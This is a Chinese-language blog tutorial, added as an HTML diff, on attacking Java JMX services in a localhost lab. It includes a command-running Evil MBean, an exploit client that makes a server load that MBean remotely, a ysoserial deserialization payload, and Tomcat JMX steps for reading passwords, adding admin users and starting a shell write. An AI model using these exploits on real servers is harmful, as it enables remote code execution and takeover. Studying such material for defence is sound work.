@@ -1,0 +1,1532 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next beep use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+  
+  
+    
+    
+  <script src="/lib/pace/pace.min.js?v=1.0.2"></script>
+  <link href="/lib/pace/pace-theme-flash.min.css?v=1.0.2" rel="stylesheet">
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+  
+
+<link href="https://cdn.bootcss.com/font-awesome/4.6.2/css/font-awesome.min.css" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.ico?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.ico?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="java安全,JMX," />
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="JMX介绍JMX 全称为 Java Management Extensions，翻译过来就是 Java 管理扩展，用来管理和监测 Java 程序。最常用到的就是对于 JVM 的监测和管理，比如 JVM 内存、CPU 使用率、线程数、垃圾收集情况等等。 用 Spring Boot 去理解，Spring Boot Actuator 它就用到了 JMX （Spring Boot &gt; 2.2.x 默">
+<meta property="og:type" content="article">
+<meta property="og:title" content="JMX攻击">
+<meta property="og:url" content="http://1azy.icu/2023/06/01/JMX/index.html">
+<meta property="og:site_name" content="1azysugar的博客">
+<meta property="og:description" content="JMX介绍JMX 全称为 Java Management Extensions，翻译过来就是 Java 管理扩展，用来管理和监测 Java 程序。最常用到的就是对于 JVM 的监测和管理，比如 JVM 内存、CPU 使用率、线程数、垃圾收集情况等等。 用 Spring Boot 去理解，Spring Boot Actuator 它就用到了 JMX （Spring Boot &gt; 2.2.x 默">
+<meta property="og:locale">
+<meta property="og:image" content="http://1azy.icu/images/20230601171558.png">
+<meta property="og:image" content="http://1azy.icu/images/20230601222529.png">
+<meta property="og:image" content="http://1azy.icu/images/20230601224936.png">
+<meta property="og:image" content="http://1azy.icu/images/20230601232259.png">
+<meta property="og:image" content="http://1azy.icu/images/20230601232833.png">
+<meta property="og:image" content="http://1azy.icu/images/20230601232958.png">
+<meta property="og:image" content="http://1azy.icu/images/20230601233920.png">
+<meta property="og:image" content="http://1azy.icu/images/20230602000002.png">
+<meta property="og:image" content="http://1azy.icu/images/20230602000218.png">
+<meta property="article:published_time" content="2023-05-31T18:57:13.000Z">
+<meta property="article:modified_time" content="2023-06-02T20:29:18.619Z">
+<meta property="article:author" content="1azysugar">
+<meta property="article:tag" content="java安全">
+<meta property="article:tag" content="JMX">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://1azy.icu/images/20230601171558.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '',
+    scheme: 'Beep',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":6,"b2t":false,"scrollpercent":true,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://1azy.icu/2023/06/01/JMX/"/>
+
+
+
+<!-- 文章加密 -->
+<script>
+    (function(){
+        if(''){
+            if (prompt('请输入文章密码') !== ''){
+                alert('密码错误！');
+		if (history.length === 1) {
+		    window.opener = null;
+		    window.open('', '_self');
+		    window.close();
+                } else {
+                    history.back();
+                }
+            }
+        }
+    })();
+</script>
+
+<!-- fontawesome5 -->
+<link href="/lib/font-awesome/css/fontawesome-all.min.css" rel="stylesheet" type="text/css" />
+
+  <title>JMX攻击 | 1azysugar的博客</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband">
+	<a href="https://github.com/lazysugar" target="_blank"><img style="position: absolute; top: 0; right: 0; border: 0;" src="/images/headband/forkme_right_red.png" alt="Fork me on GitHub"></a>
+    </div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">1azysugar的博客</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <h1 class="site-subtitle" itemprop="description">1azysugar的博客</h1>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa-fw fas fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa-fw fas fa-question-circle"></i> <br />
+            
+            文章
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa-fw fas fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa-fw fas fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fas fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fas fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="far fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+    
+    <a href="https://github.com/lazysugar" class="github-corner" target="_blank" title="Follow me on GitHub" aria-label="Follow me on GitHub">
+      <svg width="80" height="80" viewBox="0 0 250 250" style="fill:#222; color:#fff; position: absolute; top: 0; border: 0; right: 0;" aria-hidden="true">
+        <path d="M0,0 L115,115 L130,115 L142,142 L250,250 L250,0 Z"></path><path d="M128.3,109.0 C113.8,99.7 119.0,89.6 119.0,89.6 C122.0,82.7 120.5,78.6 120.5,78.6 C119.2,72.0 123.4,76.3 123.4,76.3 C127.3,80.9 125.5,87.3 125.5,87.3 C122.9,97.6 130.6,101.9 134.4,103.2" fill="currentColor" style="transform-origin: 130px 106px;" class="octo-arm"></path>
+	<path d="M115.0,115.0 C114.9,115.1 118.7,116.5 119.8,115.4 L133.7,101.6 C136.9,99.2 139.9,98.4 142.2,98.6 C133.8,88.0 127.5,74.4 143.8,58.0 C148.5,53.4 154.0,51.2 159.7,51.0 C160.3,49.4 163.2,43.6 171.4,40.1 C171.4,40.1 176.1,42.5 178.8,56.2 C183.1,58.6 187.2,61.8 190.9,65.4 C194.5,69.0 197.7,73.2 200.1,77.6 C213.8,80.2 216.3,84.9 216.3,84.9 C212.7,93.1 206.9,96.0 205.4,96.6 C205.1,102.4 203.0,107.8 198.3,112.5 C181.9,128.9 168.3,122.5 157.7,114.1 C157.9,116.9 156.7,120.9 152.7,124.9 L141.0,136.5 C139.8,137.7 141.6,141.9 141.8,141.8 Z" fill="currentColor" class="octo-body"></path>
+      </svg>
+    </a>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://1azy.icu/2023/06/01/JMX/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="1azysugar的博客">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h2 class="post-title" itemprop="name headline">JMX攻击</h2>
+        
+
+        <div class="post-meta">
+	  
+	  
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar-plus"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2023-06-01T02:57:13+08:00">
+                2023-06-01
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="far fa-folder"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/java%E5%AE%89%E5%85%A8/" itemprop="url" rel="index">
+                    <span itemprop="name">java安全</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+            <div class="post-wordcount">
+              
+                
+                <span class="post-meta-item-icon">
+                  <!--<i class="far fa-file-word"></i>-->
+		  <i class="fas fa-book-open"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">本文共计 &#58;</span>
+                
+                <span title="本文共计">
+                   字
+                </span>
+              
+
+              
+                <span class="post-meta-divider">|</span>
+              
+
+              
+                <span class="post-meta-item-icon">
+                  <i class="far fa-clock"></i>
+                </span>
+                
+                  <span class="post-meta-item-text">阅文耗时 &asymp;</span>
+                
+                <span title="阅文耗时">
+                   min
+                </span>
+              
+            </div>
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="JMX介绍"><a href="#JMX介绍" class="headerlink" title="JMX介绍"></a>JMX介绍</h1><p>JMX 全称为 Java Management Extensions，翻译过来就是 Java 管理扩展，用来管理和监测 Java 程序。最常用到的就是对于 JVM 的监测和管理，比如 JVM 内存、CPU 使用率、线程数、垃圾收集情况等等。</p>
+<p>用 Spring Boot 去理解，Spring Boot Actuator 它就用到了 JMX （Spring Boot &gt; 2.2.x 默认禁用 JMX Tomcat Bean 暴露）。JConsole 或者 VisualVM 它们也用到了 JMX。</p>
+<p><img src="/images/20230601171558.png"></p>
+<h2 id="MBean"><a href="#MBean" class="headerlink" title="MBean"></a>MBean</h2><p>JMX 是通过各种 MBean(Managed Bean) 传递消息的，MBean 其实就是我们经常说的 Java Bean，只不过由于它比较特殊，所以称之为 MBean。既然是个 Bean，里面就是一些属性和方法，外界就可以获取被管理的资源的状态和操纵MBean的行为。JMX 中共有四种类型的 MBean，分别是 Standard MBean, Dynamic MBean, Open MBean, Model MBean。JDK 提供的 MBean 主要在 java.lang.management 和 javax.management包里面。</p>
+<h2 id="MBeanServer"><a href="#MBeanServer" class="headerlink" title="MBeanServer"></a>MBeanServer</h2><p>MBeanServer 是负责管理 MBean 的，一般一个 JVM 只有一个 MBeanServer，所有的 MBean 都要注册到 MBeanServer 上，并通过 MBeanServer 对外提供服务。一般用 ManagementFactory.getPlatformMBeanServer()方法获取当前 JVM 内的 MBeanServer。</p>
+<h2 id="适配器和连接器"><a href="#适配器和连接器" class="headerlink" title="适配器和连接器"></a>适配器和连接器</h2><p>写好的 MBean 注册到 MBeanServer 上之后，功能已经具备了。<strong>适配器和连接器就是将这些功能开放出来的方式</strong> 。 比如 HTTP协议适配器，就是将功能以 HTTP 协议开放出去，这样我们就可以在浏览器使用了。</p>
+<p><strong>连接器是各种客户端最常用的，JDK 提供的默认连接器是 RMI 连接器，JConsole、VisualVM 都是使用它。</strong></p>
+<h1 id="基于RMI的JMX演示"><a href="#基于RMI的JMX演示" class="headerlink" title="基于RMI的JMX演示"></a>基于RMI的JMX演示</h1><pre><code>public class JMXDemo &#123;
+    public static void main(String[] args) throws Exception &#123;
+        MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer();
+        ObjectName objectName = new ObjectName(&quot;test:type=HelloWorld&quot;);
+        Hello mbean = new Hello();
+        mBeanServer.registerMBean(mbean, objectName);
+
+        Registry registry = LocateRegistry.createRegistry(1199);
+        
+        JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1199/jmxrmi&quot;);
+        JMXConnectorServer jmxConnectorServer = JMXConnectorServerFactory.newJMXConnectorServer(jmxServiceURL, null, mBeanServer);
+        jmxConnectorServer.start();
+        System.out.println(&quot;Server start...&quot;);
+    &#125;
+&#125;
+</code></pre>
+<p>拆解：</p>
+<ul>
+<li>Probe Level</li>
+</ul>
+<p>实例化HelloMBean类为mbean</p>
+<blockquote>
+<p>standard MBean：它能管理的资源（包括属性，方法，时间）必须定义在接口中，实例化的MBean必须实现这个接口。它的命名也必须遵循一定的规范，例如我们的MBean为Hello，则接口必须为HelloMBean。<br>dynamic MBean：必须实现javax.management.DynamicMBean接口，所有的属性，方法都在运行时定义。</p>
+</blockquote>
+<p>代码：</p>
+<pre><code>ObjectName objectName = new ObjectName(&quot;test:type=Hello&quot;);
+Hello mbean = new Hello();
+</code></pre>
+<ul>
+<li>Agent Level</li>
+</ul>
+<p>创建了 MBeanServer 实例。<br>主要提供对资源的注册和管理。注册了mbean（具有唯一ObjectName）。</p>
+<pre><code>MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer();
+mBeanServer.registerMBean(mbean, objectName);
+</code></pre>
+<ul>
+<li>Remote Management Level</li>
+</ul>
+<p>创建了JMXServiceURL，绑定到本地1199端口的RMI服务（基于RMI服务的），关联到MBeanServer。</p>
+<pre><code>Registry registry = LocateRegistry.createRegistry(1199);
+JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1199/jmxrmi&quot;);
+JMXConnectorServer jmxConnectorServer = JMXConnectorServerFactory.newJMXConnectorServer(jmxServiceURL, null, mBeanServer);
+jmxConnectorServer.start();
+</code></pre>
+<h2 id="使用jconsole图形工具监视、管理JMX"><a href="#使用jconsole图形工具监视、管理JMX" class="headerlink" title="使用jconsole图形工具监视、管理JMX"></a>使用jconsole图形工具监视、管理JMX</h2><p><code>jconsole</code>是基于JMX的可视化监视、管理工具，该工具是JDK的一部分<br>本地可以通过进程方式进行连接，远程可以通过<code>ip:port</code>方式进行连接。</p>
+<p>我们连接刚刚创建的rmi服务。</p>
+<p><img src="/images/20230601222529.png"></p>
+<p>可以用来获取&#x2F;设置bean属性，或调用方法。</p>
+<h1 id="攻击一：使用Melt加载远程MBean"><a href="#攻击一：使用Melt加载远程MBean" class="headerlink" title="攻击一：使用Melt加载远程MBean"></a>攻击一：使用Melt加载远程MBean</h1><h2 id="介绍MLet"><a href="#介绍MLet" class="headerlink" title="介绍MLet"></a>介绍MLet</h2><p>Mlet是一个类：<code>javax.management.loading.MLet</code>，这是一个mbean（实现接口<code>MLetMBean</code>）。该mbean存在一个方法<code>getMBeansFromURL</code>，可以从远程<code>mlet server</code>加载mbean。</p>
+<p><img src="/images/20230601224936.png"></p>
+<p>所以利用Melt攻击流程总结如下：</p>
+<ol>
+<li>MBeanServer中存在MLet的MBean</li>
+<li>利用MLet方法去加载我们恶意server中的Mlet文件</li>
+<li>Mlet文件中写入我们恶意jar包服务，被加载</li>
+<li>jar包中的恶意Mbean被加载进MBeanServer</li>
+<li>通过JMX调用恶意MBean的方法</li>
+</ol>
+<h2 id="攻击示例与分析"><a href="#攻击示例与分析" class="headerlink" title="攻击示例与分析"></a>攻击示例与分析</h2><p>创建恶意jar文件，用于命令执行</p>
+<p>EvilMBean.java:</p>
+<pre><code>public interface EvilMBean &#123;
+    String runCommand(String cmd);
+&#125;
+</code></pre>
+<p>Evil.java:</p>
+<pre><code>public class Evil implements EvilMBean&#123;
+    @Override
+    public String runCommand(String cmd) &#123;
+        try &#123;
+            Runtime rt = Runtime.getRuntime();
+            Process proc = rt.exec(cmd);
+            BufferedReader stdInput = new BufferedReader(new InputStreamReader(proc.getInputStream()));
+            BufferedReader stdError = new BufferedReader(new InputStreamReader(proc.getErrorStream()));
+            String stdout_err_data = &quot;&quot;;
+            String s;
+            while ((s = stdInput.readLine()) != null)
+            &#123;
+                stdout_err_data += s+&quot;\n&quot;;
+            &#125;
+            while ((s = stdError.readLine()) != null)
+            &#123;
+                stdout_err_data += s+&quot;\n&quot;;
+            &#125;
+            proc.waitFor();
+            return stdout_err_data;
+        &#125;
+        catch (Exception e)
+        &#123;
+            return e.toString();
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>创建MLet文件，用于指向我们恶意jar包服务</p>
+<p><code>mlet.txt</code>:</p>
+<pre><code>&lt;html&gt;&lt;mlet code=&quot;Evil&quot; archive=&quot;Evil.jar&quot; name=&quot;MLetCompromise:name=evil,id=1&quot; codebase=&quot;http://127.0.0.1:8000&quot;&gt;&lt;/mlet&gt;&lt;/html&gt;
+</code></pre>
+<p><code>Evil&quot;</code>为恶意mbean的路径；</p>
+<p><code>archive=&quot;Evil.jar&quot;</code>为恶意mbean的jar包；</p>
+<p><code>name=&quot;MLetCompromise:name=evil,id=1&quot;</code>可自定义，遵循OBjectname规则；</p>
+<p><code>codebase=&quot;http://127.0.0.1:8000&quot;</code>访问为jar包的url。</p>
+<p>将Evil.jar和mlet.txt放在同一目录，<code>python3 -m http.server 8000</code>启动web服务。</p>
+<p>受害者MBeanServer：</p>
+<pre><code>public class MeltJMXDemo &#123;
+    public static void main(String[] args) throws Exception &#123;
+        MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer();
+        MLet mLet = new MLet();
+        ObjectName objectNameMLet = new ObjectName(&quot;JMXMLet:type=MLet&quot;);
+        mBeanServer.registerMBean(mLet, objectNameMLet);
+
+        Registry registry = LocateRegistry.createRegistry(1199);
+
+        JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1199/jmxrmi&quot;);
+        JMXConnectorServer jmxConnectorServer = JMXConnectorServerFactory.newJMXConnectorServer(jmxServiceURL, null, mBeanServer);
+        jmxConnectorServer.start();
+        System.out.println(&quot;MeltJMXServer start...&quot;);
+    &#125;
+&#125;
+</code></pre>
+<p>通过jconsole攻击：</p>
+<p>本地起一个server，目录下包含我们的恶意melt文件和jar包</p>
+<p><img src="/images/20230601232259.png"></p>
+<p>通过jconsole调用Melt的<code>getMBeansFromURL</code>方法，参数中填入我们的恶意server地址</p>
+<p><img src="/images/20230601232833.png"></p>
+<p>我们的恶意MBean被成功加载，通过恶意MBean命令执行</p>
+<p><img src="/images/20230601232958.png"></p>
+<h1 id="攻击二：远程加载MBean"><a href="#攻击二：远程加载MBean" class="headerlink" title="攻击二：远程加载MBean"></a>攻击二：远程加载MBean</h1><p>JMX Server可以在本地绑定MBean，同时也可以加载远程MBean，并且这一过程我们可以在客户端控制。</p>
+<h2 id="攻击示例"><a href="#攻击示例" class="headerlink" title="攻击示例"></a>攻击示例</h2><p>随便起一个JMXServer，里面随便绑定了个MBean，并没有绑定MLet</p>
+<pre><code>public class JMXDemo &#123;
+    public static void main(String[] args) throws Exception &#123;
+        MBeanServer mBeanServer = ManagementFactory.getPlatformMBeanServer();
+        ObjectName objectName = new ObjectName(&quot;test:type=Hello&quot;);
+        Hello mbean = new Hello();
+        mBeanServer.registerMBean(mbean, objectName);
+
+        Registry registry = LocateRegistry.createRegistry(1199);
+
+        JMXServiceURL jmxServiceURL = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1199/jmxrmi&quot;);
+        JMXConnectorServer jmxConnectorServer = JMXConnectorServerFactory.newJMXConnectorServer(jmxServiceURL, null, mBeanServer);
+        jmxConnectorServer.start();
+        System.out.println(&quot;Server start...&quot;);
+    &#125;
+&#125;
+</code></pre>
+<p>通过远程加载MLet，再去加载我们的恶意server中的MBean</p>
+<pre><code>public class ExploitJMXByRemoteMBean &#123;
+    public static void main(String[] args) throws MalformedURLException &#123;
+        connectAndOwn(&quot;127.0.0.1&quot;, &quot;1199&quot;, &quot;ipconfig&quot;);
+    &#125;
+
+    static void connectAndOwn(String serverName, String port, String command) throws MalformedURLException &#123;
+        try &#123;
+            // step1. 通过rmi创建 jmx连接
+            JMXServiceURL u = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://&quot; + serverName + &quot;:&quot; + port + &quot;/jmxrmi&quot;);
+            System.out.println(&quot;URL: &quot; + u + &quot;, connecting&quot;);
+            JMXConnector c = JMXConnectorFactory.connect(u);
+            System.out.println(&quot;Connected: &quot; + c.getConnectionId());
+            MBeanServerConnection m = c.getMBeanServerConnection();
+            // step2. 加载特殊MBean：javax.management.loading.MLet
+            ObjectInstance evil_bean = null;
+            ObjectInstance evil = null;
+            try &#123;
+                evil = m.createMBean(&quot;javax.management.loading.MLet&quot;, null);
+            &#125; catch (javax.management.InstanceAlreadyExistsException e) &#123;
+                evil = m.getObjectInstance(new ObjectName(&quot;DefaultDomain:type=MLet&quot;));
+            &#125;
+            // step3：通过MLet加载远程恶意MBean
+            System.out.println(&quot;Loaded &quot;+evil.getClassName());
+            Object res = m.invoke(evil.getObjectName(), &quot;getMBeansFromURL&quot;, new Object[]
+                            &#123; &quot;http://127.0.0.1:8000/mlet.txt&quot; &#125;,
+                    new String[] &#123; String.class.getName() &#125; );
+            HashSet res_set = ((HashSet)res);
+            Iterator itr = res_set.iterator();
+            Object nextObject = itr.next();
+            // 如果恶意mbean已经存在，则直接获取
+            if (nextObject instanceof InstanceAlreadyExistsException)
+            &#123;
+                //
+                evil_bean = m.getObjectInstance(new ObjectName(&quot;MLetCompromise:name=evil,id=1&quot;));
+            &#125; else if (nextObject instanceof Exception) &#123;
+                throw ((Exception)nextObject);
+            &#125; else &#123;
+                evil_bean = ((ObjectInstance)nextObject);
+            &#125;
+            // step4: 执行恶意MBean
+            System.out.println(&quot;Loaded class: &quot;+evil_bean.getClassName()+&quot; object &quot;+evil_bean.getObjectName());
+            System.out.println(&quot;Calling runCommand with: &quot;+command);
+            Object result = m.invoke(evil_bean.getObjectName(), &quot;runCommand&quot;, new Object[]&#123; command &#125;, new String[]&#123; String.class.getName() &#125;);
+            System.out.println(&quot;Result: &quot;+result);
+        &#125; catch (Exception e)
+        &#123;
+            e.printStackTrace();
+        &#125;
+    &#125;
+&#125;
+</code></pre>
+<p>恶意MBean被加载，成功命令执行</p>
+<p><img src="/images/20230601233920.png"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>该攻击需要两个条件：</p>
+<ol>
+<li>未启用JMX身份验证</li>
+<li>可以调用 <code>getMBeansFromURL</code></li>
+</ol>
+<p>需要设置<code>jmx.remote.x.mlet.allow.getMBeansFromURL=true</code></p>
+<pre><code>MBeanServerAccessController：
+
+final String propName =&quot;jmx.remote.x.mlet.allow.getMBeansFromURL&quot;;
+GetPropertyAction propAction = new GetPropertyAction(propName);
+String propValue = AccessController.doPrivileged(propAction);
+boolean allowGetMBeansFromURL =&quot;true&quot;.equalsIgnoreCase(propValue);
+if (!allowGetMBeansFromURL) &#123;
+    throw new SecurityException(&quot;Access denied! MLet method &quot; +
+            &quot;getMBeansFromURLcannot be invoked unless a &quot; +
+            &quot;security manageris installed or the system property &quot; +
+            &quot;-Djmx.remote.x.mlet.allow.getMBeansFromURL=true&quot; +
+            &quot;isspecified.&quot;);
+&#125;
+</code></pre>
+<h1 id="攻击三：通过MBean方法参数反序列化攻击JMX"><a href="#攻击三：通过MBean方法参数反序列化攻击JMX" class="headerlink" title="攻击三：通过MBean方法参数反序列化攻击JMX"></a>攻击三：通过MBean方法参数反序列化攻击JMX</h1><h2 id="JMX调用MBean的流程"><a href="#JMX调用MBean的流程" class="headerlink" title="JMX调用MBean的流程"></a>JMX调用MBean的流程</h2><ol>
+<li>将<code>MBean name</code>、<code>MBean Function Name</code>、<code>params</code>发送给远程<code>rmi server</code>，其中<code>params</code>的处理需要注意下，先转为<code>MarshalledObject</code>，再<code>writeObject</code>为<code>String</code>对象，然后进入网络传输；</li>
+<li><code>RMI Server</code>监听到网络请求包含<code>MBean name</code>、<code>MBean Function Name</code>、<code>params</code>，其中params经过<code>MarshalledObject.readObject()</code>反序列化，再通过<code>invoke</code>调用原函数。</li>
+</ol>
+<h2 id="攻击示例-1"><a href="#攻击示例-1" class="headerlink" title="攻击示例"></a>攻击示例</h2><p>使用<code>CommonsCollections2</code>链，参考<code>ysoserial.exploit.JMXInvokeMBean</code></p>
+<pre><code>public class AttackMBeanParams &#123;
+
+    public static void main(String[] args) throws Exception &#123;
+
+        JMXServiceURL url = new JMXServiceURL(&quot;service:jmx:rmi:///jndi/rmi://127.0.0.1:1199/jmxrmi&quot;);
+
+        JMXConnector jmxConnector = JMXConnectorFactory.connect(url);
+        MBeanServerConnection mbeanServerConnection = jmxConnector.getMBeanServerConnection();
+
+        // create the payload
+        Object payloadObject = ObjectPayload.Utils.makePayloadObject(&quot;CommonsCollections2&quot;, &quot;calc&quot;);
+        ObjectName mbeanName = new ObjectName(&quot;java.util.logging:type=Logging&quot;);
+
+        mbeanServerConnection.invoke(mbeanName, &quot;getLoggerLevel&quot;, new Object[]&#123;payloadObject&#125;, new String[]&#123;String.class.getCanonicalName()&#125;);
+
+        //close the connection
+        jmxConnector.close();
+    &#125;
+&#125;
+</code></pre>
+<p><img src="/images/20230602000002.png"></p>
+<h2 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h2><p>ysoserial用的<code>java.util.logging:type=Logging</code>，换其他ObjectName也行</p>
+<p><img src="/images/20230602000218.png"></p>
+<h1 id="攻击四：利用中间件等的特殊MBean攻击JMX"><a href="#攻击四：利用中间件等的特殊MBean攻击JMX" class="headerlink" title="攻击四：利用中间件等的特殊MBean攻击JMX"></a>攻击四：利用中间件等的特殊MBean攻击JMX</h1><h2 id="通过JMX攻击Tomcat"><a href="#通过JMX攻击Tomcat" class="headerlink" title="通过JMX攻击Tomcat"></a>通过JMX攻击Tomcat</h2><p>Tomcat中默认不开启JMX服务，需要在catalina.bat中配置启动参数</p>
+<pre><code>set &quot;CATALINA_OPTS=%CATALINA_OPTS% -Dcom.sun.management.jmxremote -DJava.rmi.server.hostname=0.0.0.0 -Dcom.sun.management.jmxremote.port=9999 -Dcom.sun.management.jmxremote.ssl=false -Dcom.sun.management.jmxremote.authenticate=false&quot;
+rem   CATALINA_OPTS   (Optional) Java runtime options used when the &quot;start&quot;,
+rem                   &quot;run&quot; or &quot;debug&quot; command is executed.
+rem                   Include here and not in JAVA_OPTS all options, that should
+rem                   only be used by Tomcat itself, not by the stop process,
+rem                   the version command etc.
+</code></pre>
+<p>在9999端口启动一个无认证的JMX服务。</p>
+<p>使用jconsole连接到本地tomcat启动的JMX服务。</p>
+<h3 id="获取已有用户的密码"><a href="#获取已有用户的密码" class="headerlink" title="获取已有用户的密码"></a>获取已有用户的密码</h3><p><code>User</code>-&gt;<code>&quot;tomcatAdmin&quot;</code>-&gt;<code>UserDatabase</code></p>
+<h3 id="添加管理员角色用户"><a href="#添加管理员角色用户" class="headerlink" title="添加管理员角色用户"></a>添加管理员角色用户</h3><ol>
+<li><p><code>Users</code>-&gt;<code>UserDatabase</code>，<code>createUser</code>：</p>
+</li>
+<li><p><code>Users</code>-&gt;<code>UserDatabase</code>，创建角色</p>
+</li>
+<li><p><code>Users</code>-&gt;<code>User</code>-&gt;<code>[用户名]</code>节点下，将创建的用户与创建的角色关联</p>
+</li>
+<li><p>保存配置</p>
+</li>
+</ol>
+<h3 id="日志循环函数导致写shell"><a href="#日志循环函数导致写shell" class="headerlink" title="日志循环函数导致写shell"></a>日志循环函数导致写shell</h3><p>Catalina-&gt;Valve-&gt;localhost-&gt;AccessLogValve-&gt;Operations</p>
+<p>boolean rotate(string newFileName)</p>
